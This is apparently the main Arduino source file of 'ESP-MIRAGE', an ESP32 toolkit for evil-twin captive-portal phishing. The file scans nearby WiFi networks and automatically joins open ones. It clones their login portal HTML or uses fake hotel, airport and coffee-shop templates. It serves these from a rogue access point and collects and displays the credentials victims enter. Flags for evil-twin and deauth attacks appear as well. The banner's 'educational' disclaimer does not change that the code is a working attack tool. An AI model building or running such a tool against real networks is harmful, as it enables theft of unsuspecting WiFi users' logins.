#include <Arduino.h>
#include "config.h"
#include "wifi_scanner.h"
#include "websocket_server.h"
#include "captive_portal.h"
#include "portal_cloner.h"

// Global objects
WiFiScanner scanner;
WSTerminalServer wsServer(WEBSOCKET_PORT);
CaptivePortal portal;
PortalCloner portalCloner;
bool inSubMenu = false;
enum SubMenuState {
    MENU_NONE,
    MENU_PORTAL_SELECT
};
SubMenuState subMenuState = MENU_NONE;

int portalType = PORTAL_GENERIC;

// Input buffer for WebSocket
String inputBuffer = "";
uint8_t currentClient = 0;

// Output wrapper - prints to both Serial and WebSocket
class Output {
public:
    void print(const String &s) {
        Serial.print(s);
        if (ENABLE_WEBSOCKET && wsServer.isClientConnected()) {
            wsServer.broadcastText(s);
        }
    }
    
    void print(const char* s) {
        Serial.print(s);
        if (ENABLE_WEBSOCKET && wsServer.isClientConnected()) {
            wsServer.broadcastText(s);
        }
    }
    
    void println(const String &s) {
        Serial.println(s);
        if (ENABLE_WEBSOCKET && wsServer.isClientConnected()) {
            wsServer.broadcastText(s + "\n");
        }
    }
    
    void println(const char* s) {
        Serial.println(s);
        if (ENABLE_WEBSOCKET && wsServer.isClientConnected()) {
            String str = String(s) + "\n";
            wsServer.broadcastText(str);
        }
    }
    
    void printf(const char* format, ...) {
        char buffer[256];
        va_list args;
        va_start(args, format);
        vsnprintf(buffer, sizeof(buffer), format, args);
        va_end(args);
        
        Serial.print(buffer);
        if (ENABLE_WEBSOCKET && wsServer.isClientConnected()) {
            wsServer.broadcastText(buffer);
        }
    }
};

Output out;

// Function prototypes
void printBanner();
void printMenu();
void handleSerialInput();
void handleCommand(String cmd);
void scanMode();
void captivePortalMode();
void clonePortalMode();
void viewCredentials();
void viewClonedPortal();
void setupControlAP();
void setupLED();
void blinkLED(int times, int delayMs);
void printSystemInfo();
void printNetworkInfo();
void onWebSocketMessage(uint8_t clientNum, String message);

void setup() {
    Serial.begin(SERIAL_BAUD);
    delay(STARTUP_DELAY);
    
    // Setup LED only if enabled
    if (ENABLE_LED) {
        setupLED();
    }
    
    // Print banner
    printBanner();
    
    // Setup Control AP for remote access
    setupControlAP();
    
    // Start WebSocket server if enabled
    if (ENABLE_WEBSOCKET) {
        wsServer.begin();
        wsServer.setMessageCallback(onWebSocketMessage);
        out.println("[+] WebSocket server started");
        out.printf("[+] Connect from browser or terminal client\n");
        out.printf("[+] URL: ws://%s:%d\n", WiFi.softAPIP().toString().c_str(), WEBSOCKET_PORT);
    }
    
    out.println("[+] ESP32 initialized successfully");
    out.println("[+] Ready to start...\n");
    
    // Show menu
    printMenu();
}

void loop() {
    // Handle WebSocket events
    if (ENABLE_WEBSOCKET) {
        wsServer.loop();
    }
    
    // Handle captive portal
    if (portal.isRunning()) {
        portal.handleClient();
    }
    
    // Check for Serial input
    if (Serial.available() > 0) {
        handleSerialInput();
    }
    
    delay(10);
}

void setupControlAP() {
    out.println("\n[*] Setting up Control Access Point...");
    
    // Configure AP
    WiFi.mode(WIFI_AP_STA);  // AP + Station mode
    WiFi.softAP(CONTROL_AP_SSID, CONTROL_AP_PASSWORD, 
                CONTROL_AP_CHANNEL, CONTROL_AP_HIDDEN, 
                CONTROL_AP_MAX_CONN);
    
    IPAddress IP = WiFi.softAPIP();
    
    out.println("\n╔══════════════════════════════════════════════════════════════╗");
    out.println("║              CONTROL ACCESS POINT READY                      ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.printf("║ SSID:          %-45s ║\n", CONTROL_AP_SSID);
    out.printf("║ Password:      %-45s ║\n", CONTROL_AP_PASSWORD);
    out.printf("║ IP Address:    %-45s ║\n", IP.toString().c_str());
    out.printf("║ WebSocket:     ws://%-38s   ║\n", (IP.toString() + ":" + String(WEBSOCKET_PORT)).c_str());
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.println("║ How to connect:                                              ║");
    out.printf("║ 1. Connect to WiFi: %s                            ║\n", CONTROL_AP_SSID);
    out.println("║ 2. Open the HTML terminal client in your browser             ║");
    out.println("║ 3. Enter WebSocket URL and click Connect                     ║");
    out.println("╚══════════════════════════════════════════════════════════════╝\n");
}

void printBanner() {
    out.println("\n\n");
    out.println("╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗");
    out.println("║                                                                                                   ║");
    out.println("║   ███████╗███████╗██████╗ ██████╗ ██████╗       ███╗   ███╗██╗██████╗  █████╗  ██████╗ ███████╗   ║");
    out.println("║   ██╔════╝██╔════╝██╔══██╗╚════██╗╚════██╗      ████╗ ████║██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝   ║");
    out.println("║   █████╗  ███████╗██████╔╝ █████╔╝ █████╔╝█████╗██╔████╔██║██║██████╔╝███████║██║  ███╗█████╗     ║");
    out.println("║   ██╔══╝  ╚════██║██╔═══╝  ╚═══██╗██╔═══╝ ╚════╝██║╚██╔╝██║██║██╔══██╗██╔══██║██║   ██║██╔══╝     ║");
    out.println("║   ███████╗███████║██║     ██████╔╝███████╗      ██║ ╚═╝ ██║██║██║  ██║██║  ██║╚██████╔╝███████╗   ║");
    out.println("║   ╚══════╝╚══════╝╚═╝     ╚═════╝ ╚══════╝      ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ║");
    out.println("║                                                                                                   ║");
    out.println("║                                      ░ E S P - M I R A G E ░                                      ║");
    out.println("║                          ESP32 Captive-Portal Toolkit — Research Only                             ║");
    out.println("║                                                                                                   ║");
    out.println("║                      ⚠️  EDUCATIONAL — DO NOT USE ON OTHERS' NETWORKS ⚠️                            ║");
    out.println("║                                                                                                   ║");
    out.println("║                          Author:./runme             •   Version: 1.5                              ║");
    out.println("║                                                                                                   ║");
    out.println("╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝");
    out.println("");
}

void printMenu() {
    out.println("\n╔══════════════════════════════════════════════════════════════╗");
    out.println("║                        MAIN MENU                             ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.println("║                                                              ║");
    out.println("║  [1] Scan WiFi Networks                                      ║");
    out.println("║  [2] Clone Captive Portal                                    ║");
    out.println("║  [3] View Cloned Portal Info                                 ║");
    out.println("║  [4] Start Captive Portal                                    ║");
    out.println("║  [5] Stop Captive Portal                                     ║");
    out.println("║  [6] View Captured Credentials                               ║");
    out.println("║  [7] System Information                                      ║");
    out.println("║  [8] Network Information                                     ║");
    out.println("║  [9] Clear Captured Credentials                              ║");
    out.println("║  [h] Help / Show Menu                                        ║");
    out.println("║  [C] Clear Cloned Portal                                     ║");
    out.println("║  [0] Restart ESP32                                           ║");
    out.println("║                                                              ║");
    out.println("╚══════════════════════════════════════════════════════════════╝");
    out.print("\nEnter your choice: ");
}

void handleSerialInput() {
    char c = Serial.read();
    
    if (c == '\n' || c == '\r') {
        if (inputBuffer.length() > 0) {
            handleCommand(inputBuffer);
            inputBuffer = "";
        }
    } else {
        inputBuffer += c;
        Serial.print(c); // Echo
    }
}

void onWebSocketMessage(uint8_t clientNum, String message) {
    currentClient = clientNum;
    message.trim();
    
    if (message.length() > 0) {
        handleCommand(message);
    }
}

void handleCommand(String cmd) {
    cmd.trim();
    if (cmd.length() == 0) return;
    
    out.println("");
    
    // Handle submenu state first
    if (subMenuState == MENU_PORTAL_SELECT) {
        char typeChoice = cmd.charAt(0);
        if (typeChoice == 'b' || typeChoice == 'B') {
            out.println("[*] Returning to Main Menu...");
            subMenuState = MENU_NONE;
            inSubMenu = false;
            delay(500);
            printMenu();
            return;
        }
        // --- New cloned portal option ---
        if (typeChoice == '5') {
            extern PortalCloner portalCloner;  // assuming global instance
            out.println("\n[*] Initializing Cloned Captive Portal...");

            if (!portalCloner.hasClonedPortal()) {
                out.println("[-] No cloned portal found! Please clone a portal first.");
            } else {
                ClonedPortal cloned = portalCloner.getClonedPortal();
                portal.useClonedPortal(cloned.html);

                if (WiFi.getMode() != WIFI_AP) {
                    WiFi.mode(WIFI_AP);
                    WiFi.softAP("ESP32_Cloned_Portal");
                    out.printf("[+] Access Point started: %s\n", WiFi.softAPIP().toString().c_str());
                }

                portal.begin("ESP32_Cloned_Portal");

                out.println("\n╔══════════════════════════════════════════════════════════════╗");
                out.println("║                 CLONED CAPTIVE PORTAL STARTED                ║");
                out.println("╠══════════════════════════════════════════════════════════════╣");
                out.printf ("║  Source SSID : %-45s ║\n", cloned.ssid.c_str());
                out.printf ("║  Portal URL  : http://%-37s ║\n", WiFi.softAPIP().toString().c_str());
                out.printf ("║  HTML Size   : %-45d ║\n", cloned.htmlSize);
                out.println("╚══════════════════════════════════════════════════════════════╝");
            }

            subMenuState = MENU_NONE;
            inSubMenu = false;
            delay(1000);
            printMenu();
            return;
        }
        // --- Normal portal options ---
        switch (typeChoice) {
        case '1': portalType = PORTAL_GENERIC; break;
        case '2': portalType = PORTAL_HOTEL; break;
        case '3': portalType = PORTAL_AIRPORT; break;
        case '4': portalType = PORTAL_COFFEE; break;
        default:
            out.println("\n[-] Invalid choice! Defaulting to Generic Portal.");
            break;
        }


        out.println("\n[*] Initializing Captive Portal...");
        portal.setPortalType(portalType);

        if (WiFi.getMode() != WIFI_AP) {
            WiFi.mode(WIFI_AP);
            WiFi.softAP("ESP32_Captive_Portal");
            out.printf("[+] Access Point started: %s\n", WiFi.softAPIP().toString().c_str());
        }

        portal.begin("ESP32_Captive_Portal");
        out.println("[+] Captive Portal started!");
        out.println("\n╔══════════════════════════════════════════════════════════════╗");
        out.println("║                  CAPTIVE PORTAL STARTED                       ║");
        out.println("╠══════════════════════════════════════════════════════════════╣");
        out.printf ("║  Portal Type : %-45s ║\n", 
            (portalType == PORTAL_HOTEL ? "Hotel Wi-Fi" :
            portalType == PORTAL_AIRPORT ? "Airport Wi-Fi" :
            portalType == PORTAL_COFFEE ? "Coffee Shop Wi-Fi" :
            "Generic Wi-Fi"));
        out.printf ("║  Portal URL  : http://%-37s ║\n", WiFi.softAPIP().toString().c_str());
        out.println("╚══════════════════════════════════════════════════════════════╝");
        
        subMenuState = MENU_NONE;
        inSubMenu = false;
        delay(1000);
        printMenu();
        return;
    }

    // Main menu command handling
    char choice = cmd.charAt(0);
    
    switch (choice) {
        case '1':
            scanMode();
            break;
            
        case '2':
            clonePortalMode();
            break;
            
        case '3':
            viewClonedPortal();
            break;
            
        case '4':
            captivePortalMode();
            break;
            
        case '5':
            if (portal.isRunning()) {
                portal.stop();
                out.println("[*] Captive Portal stopped");
            } else {
                out.println("[-] Captive Portal is not running");
            }
            break;
            
        case '6':
            viewCredentials();
            break;
            
        case '7':
            printSystemInfo();
            break;
            
        case '8':
            printNetworkInfo();
            break;
            
        case '9':
            portal.clearCredentials();
            out.println("[*] All credentials cleared");
            break;
            
        case 'h':
        case 'H':
            printMenu();
            return; // Don't show menu again
            
        case '0':
            out.println("[*] Restarting ESP32...");
            delay(1000);
            ESP.restart();
            break;

        case 'c':
        case 'C':
            if (!portalCloner.hasClonedPortal()) {
            out.println("[-] No cloned portal found. Run clonePortalMode() first.");
            } else {
                out.println("\n[*] Clearing cloned portal data...");
                portalCloner.clearClonedPortal();
                out.println("[+] Cloned portal data cleared successfully!");
            }
            break;
    
        default:
            out.printf("[-] Invalid choice: '%s'\n", cmd.c_str());
            out.println("[*] Type 'h' for help");
            break;
    }
    
    if (!inSubMenu) {
        delay(1000);
        printMenu();
    }
}

void clonePortalMode(){
    Serial.println("\n╔══════════════════════════════════════════════╗");
    Serial.println("║           PORTAL CLONER INITIALIZED          ║");
    Serial.println("╚══════════════════════════════════════════════╝");

    Serial.println("\n[1/4] Connecting to target network...");

    // Step 1: Connect to open network automatically
    int networkCount = WiFi.scanNetworks();
    if (networkCount <= 0) {
        Serial.println("[-] No WiFi networks found!");
        return;
    }

    bool connected = false;
    for (int i = 0; i < networkCount; i++) {
        String ssid = WiFi.SSID(i);
        int encryption = WiFi.encryptionType(i);

        // Try open networks only
        if (encryption == WIFI_AUTH_OPEN) {
            Serial.printf("[*] Trying '%s'...\n", ssid.c_str());
            if (portalCloner.connectToNetwork(ssid.c_str())) {
                connected = true;
                break;
            }
        }
    }

    if (!connected) {
        Serial.println("[-] Failed to connect to any open network!");
        return;
    }

    // Step 2: Detect captive portal
    Serial.println("\n[2/4] Detecting captive portal...");
    if (!portalCloner.detectCaptivePortal()) {
        Serial.println("[-] No captive portal detected!");
        portalCloner.disconnect();
        return;
    }

    // Step 3: Download and process HTML
    Serial.println("\n[3/4] Downloading portal HTML...");
    if (!portalCloner.downloadPortal()) {
        Serial.println("[-] Failed to clone portal HTML!");
        portalCloner.disconnect();
        return;
    }

    // Step 4: Disconnect cleanly
    Serial.println("\n[4/4] Disconnecting from target...");
    portalCloner.disconnect();

    // Print summary
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║  PORTAL CLONED SUCCESSFULLY!         ║");
    Serial.println("╚══════════════════════════════════════╝");
    Serial.println(portalCloner.getCloneInfo());

}

void viewClonedPortal(){
        Serial.println("\n===== VIEW CLONED PORTAL =====");
    if (!portalCloner.hasClonedPortal()) {
        Serial.println("[-] No cloned portal found. Run clonePortalMode() first.");
        return;
    }

    ClonedPortal cloned = portalCloner.getClonedPortal();

    Serial.println(portalCloner.getCloneInfo());
    Serial.printf("[*] Showing first 300 chars of HTML:\n\n");
    Serial.println(cloned.html.substring(0, 300));
    Serial.println("...\n");

    // Optionally save to SPIFFS (if enabled)
    /*
    File f = SPIFFS.open("/portal.html", FILE_WRITE);
    if (f) {
        f.print(cloned.html);
        f.close();
        Serial.println("[+] Saved cloned HTML to /portal.html");
    }
    */

}

void captivePortalMode() {
    inSubMenu = true;
    subMenuState = MENU_PORTAL_SELECT;

    if (portal.isRunning()) {
        out.println("[*] Captive Portal already running!");
        return;
    }

    out.println("\n╔══════════════════════════════════════════════════════════════╗");
    out.println("║                  SELECT CAPTIVE PORTAL TYPE                  ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.println("║                                                              ║");
    out.println("║  [1] Generic Wi-Fi Portal                                    ║");
    out.println("║  [2] Hotel Wi-Fi Portal                                      ║");
    out.println("║  [3] Airport Wi-Fi Portal                                    ║");
    out.println("║  [4] Coffee Shop Wi-Fi Portal                                ║");
    out.println("║  [5] Serve Cloned Captive Portal                             ║");
    out.println("║  [b] Back to Main Menu                                       ║");
    out.println("║                                                              ║");
    out.println("╚══════════════════════════════════════════════════════════════╝");
    out.print("\nEnter your choice: ");
}

void viewCredentials() {
    int count = portal.getCredentialCount();

    if (count == 0) {
        out.println("[*] No credentials captured yet.");
        return;
    }

    // Get formatted credentials string
    String formatted = portal.getFormattedCredentials();
    out.println(formatted);
}

void scanMode() {
    out.println("[*] Entering WiFi Scanner Mode");
    if (ENABLE_LED) blinkLED(3, 200);

    bool scanning = true;
    int scanCycle = 0;

    while (scanning) {
        out.printf("\n[Cycle %d/%d] Starting WiFi scan...\n", scanCycle + 1, MAX_SCAN_CYCLES);

        // Perform scan
        int count = scanner.scanNetworks();

        if (count > 0) {
            // Print to output
            out.println("\n╔════════════════════════════════════════════════════════════╗");
            out.println("║                   Available Networks                      ║");
            out.println("╠════╦══════════════════════╦═════╦═══════╦═════════╦════════╣");
            out.println("║ #  ║ SSID                ║ Ch  ║ RSSI  ║ Encrypt ║ Signal ║");
            out.println("╠════╬══════════════════════╬═════╬═══════╬═════════╬════════╣");

            for (int i = 0; i < count && i < MAX_NETWORKS; i++) {
                NetworkInfo net = scanner.getNetwork(i);
                String ssidDisplay = net.ssid;
                if (ssidDisplay.length() > 20) {
                    ssidDisplay = ssidDisplay.substring(0, 17) + "...";
                }

                out.printf("║ %-2d ║ %-20s║ %-3d ║ %-5d ║ %-7s ║ %-6s ║\n",
                        i + 1,
                        ssidDisplay.c_str(),
                        net.channel,
                        net.rssi,
                        scanner.getEncryptionType(net.encryption).c_str(),
                        scanner.getSignalStrength(net.rssi).c_str()
                );
            }

            out.println("╚════╩══════════════════════╩═════╩═══════╩═════════╩════════╝");

            // Show networks with likely captive portals
            out.println("\n[*] Networks likely to have captive portals:");
            bool foundPortal = false;
            for (int i = 0; i < count; i++) {
                if (scanner.likelyHasCaptivePortal(i)) {
                    NetworkInfo net = scanner.getNetwork(i);
                    out.printf("    - %s (Channel: %d, RSSI: %d)\n", 
                                net.ssid.c_str(), 
                                net.channel, 
                                net.rssi);
                    foundPortal = true;
                }
            }
            if (!foundPortal) {
                out.println("    - None detected");
            }
        }

        // Increment scan cycle counter
        scanCycle++;
        if (MAX_SCAN_CYCLES > 0 && scanCycle >= MAX_SCAN_CYCLES) {
            out.printf("\n[✓] Reached maximum scan cycles (%d). Stopping scanner.\n", MAX_SCAN_CYCLES);
            scanning = false;
            break;
        }

        out.println("\n[*] Type 'q' to quit scanner, or press Enter to scan again...");

        // Wait for user input or next scan
        unsigned long startWait = millis();
        bool exitScanner = false;

        while (millis() - startWait < SCAN_INTERVAL && !exitScanner) {
            // Handle WebSocket
            if (ENABLE_WEBSOCKET) {
                wsServer.loop();
            }

            // Check Serial
            if (Serial.available() > 0) {
                char c = Serial.read();
                if (c == 'q' || c == 'Q') {
                    exitScanner = true;
                }
                while (Serial.available()) Serial.read(); // Clear buffer // always clear buffer since it has small RAM init
            }

            delay(100);
        }

        if (exitScanner) {
            scanning = false;
            out.println("\n[*] Exiting scanner mode");
        } else if (scanning && ENABLE_LED) {
            blinkLED(1, 100);
        }
    }
}

void printSystemInfo() {
    out.println("╔══════════════════════════════════════════════════════════════╗");
    out.println("║                     SYSTEM INFORMATION                       ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    
    out.printf("║ Chip Model:        %-40s ║\n", ESP.getChipModel());
    out.printf("║ Chip Revision:     %-40d ║\n", ESP.getChipRevision());
    out.printf("║ CPU Frequency:     %-37d MHz ║\n", ESP.getCpuFreqMHz());
    out.printf("║ Flash Size:        %-37d KB ║\n", ESP.getFlashChipSize() / 1024);
    out.printf("║ Free Heap:         %-37d KB ║\n", ESP.getFreeHeap() / 1024);
    out.printf("║ MAC Address:       %-40s ║\n", WiFi.macAddress().c_str());
    
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.println("║                     FEATURE STATUS                           ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    
    out.printf("║ WiFi Scanner:      %-40s ║\n", ENABLE_SCANNER ? "Enabled" : "Disabled");
    out.printf("║ WebSocket Server:  %-40s ║\n", ENABLE_WEBSOCKET ? "Enabled" : "Disabled");
    out.printf("║ Web Cloner:        %-40s ║\n", ENABLE_WEB_CLONER ? "Enabled" : "Disabled");
    out.printf("║ Evil Twin AP:      %-40s ║\n", ENABLE_EVIL_TWIN ? "Enabled" : "Disabled");
    out.printf("║ Deauth Attack:     %-40s ║\n", ENABLE_DEAUTH ? "Enabled" : "Disabled");
    
    out.println("╚══════════════════════════════════════════════════════════════╝");
}

void printNetworkInfo() {
    out.println("╔══════════════════════════════════════════════════════════════╗");
    out.println("║                   NETWORK INFORMATION                        ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    
    out.printf("║ Control AP SSID:   %-40s ║\n", CONTROL_AP_SSID);
    out.printf("║ Control AP IP:     %-40s ║\n", WiFi.softAPIP().toString().c_str());
    out.printf("║ Connected Clients: %-40d ║\n", WiFi.softAPgetStationNum());
    out.printf("║ WebSocket Port:    %-40d ║\n", WEBSOCKET_PORT);
    out.printf("║ WebSocket Clients: %-40d ║\n", wsServer.getClientCount());
    out.printf("║ WebSocket URL:     ws://%-35s ║\n", 
               (WiFi.softAPIP().toString() + ":" + String(WEBSOCKET_PORT)).c_str());
    
    out.println("╠══════════════════════════════════════════════════════════════╣");
    out.println("║                 CAPTIVE PORTAL STATUS                        ║");
    out.println("╠══════════════════════════════════════════════════════════════╣");
    
    out.printf("║ Portal Status:     %-40s ║\n", portal.isRunning() ? "RUNNING" : "STOPPED");
    out.printf("║ Captured Creds:    %-40d ║\n", portal.getCredentialCount());
    out.printf("║ Portal URL:        http://%-34s ║\n", WiFi.softAPIP().toString().c_str());
    
    out.println("╚══════════════════════════════════════════════════════════════╝");
}

void setupLED() {
    if (!ENABLE_LED) return;
    
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
    
    // Startup blink sequence
    for (int i = 0; i < 3; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    }
}

void blinkLED(int times, int delayMs) {
    if (!ENABLE_LED) return;
    
    for (int i = 0; i < times; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(delayMs);
        digitalWrite(LED_PIN, LOW);
        delay(delayMs);
    }
}